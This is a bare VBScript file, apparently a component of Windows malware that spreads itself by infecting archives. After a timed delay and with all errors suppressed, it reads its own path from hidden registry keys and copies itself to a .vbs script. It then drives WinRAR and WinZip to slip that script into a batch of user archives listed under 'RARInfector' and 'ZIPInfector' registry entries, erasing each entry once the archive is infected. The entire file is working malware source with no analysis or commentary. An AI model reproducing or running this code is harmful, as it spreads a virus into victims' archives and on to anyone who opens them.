Option Explicit
On Error Resume Next 'Keine Fehler!!!

Dim wshShell, fso
Dim strReg, strPath1,strPath2, strFile
Dim fl1
Dim intMax
Dim blZip,blRar
Dim i,n, str1
Const tempReg="HKLM\Security\Provider\" 'do not change this
Const intLow=10
Const intHigh=15

Sub Sleep(seconds)
	On Error Resume Next
	Dim a1,a2
	a1=Hour(Now)*3600+Minute(Now)*60+Second(Now)
	a2=a1
	While (a2-a1<seconds)
		a2=Hour(Now)*3600+Minute(Now)*60+Second(Now)
	Wend
End Sub

Sleep(182)

Randomize Timer
Set wshShell=WScript.CreateObject("WScript.Shell")
Set fso=WScript.CreateObject("Scripting.FileSystemObject")
strReg=wshShell.RegRead(tempReg)
strFile=wshShell.RegRead(strReg) & "." & wshShell.RegRead(strReg & "Vars\%DLL_EXT%")
fso.CopyFile strFile,Left(strFile,Len(strFile)-3) & "vbs",True
Set fl1=fso.GetFile(strFile)
strFile=fl1.ShortPath
strFile=Left(strFile,Len(strFile)-3) & "vbs"
strPath1=wshShell.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\WinZip.exe\")
strPath2=wshShell.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\WinRar.exe\")
blZip = strPath1 <> ""
blRar = strPath2 <> ""

If blRar Then
	intMax=Int((intHigh-intLow+1)*Rnd+intLow)
	strPath2=Left(strPath2,Len(strPath2)-10) & "rar.exe"
	n=CInt(wshShell.RegRead(strReg & "Components\RARInfector\Total files"))
	If intMax>n Then intMax=n
	For i=1 To intMax
		str1=wshShell.RegRead(strReg & "Components\RARInfector\File" & (n-i+1))
		wshShell.Run strPath2 & " a " & str1 & " " & strFile,0,True
		wshShell.RegDelete strReg & "Components\RARInfector\File" & (n-i+1)
	Next
	wshShell.RegWrite strReg & "Components\RARInfector\Total files",n-intMax,"REG_DWORD"
End If
If blZip Then
	intMax=Int((intHigh-intLow+1)*Rnd+intLow)
	strPath1=Left(strPath1,Len(strPath1)-12) & "wzzip.exe"
	n=CInt(wshShell.RegRead(strReg & "Components\ZIPInfector\Total files"))
	If intMax>n Then intMax=n
	For i=1 To intMax
		str1=wshShell.RegRead(strReg & "Components\ZIPInfector\File" & (n-i+1))
		wshShell.Run strPath1 & " -a " & str1 & " " & strFile,1,True
		wshShell.RegDelete strReg & "Components\ZIPInfector\File" & (n-i+1)
	Next
	wshShell.RegWrite strReg & "Components\ZIPInfector\Total files",n-intMax,"REG_DWORD"
End If

WScript.DisconnectObject wshShell
WScript.DisconnectObject fso
Set wshShell=Nothing
Set fso=Nothing
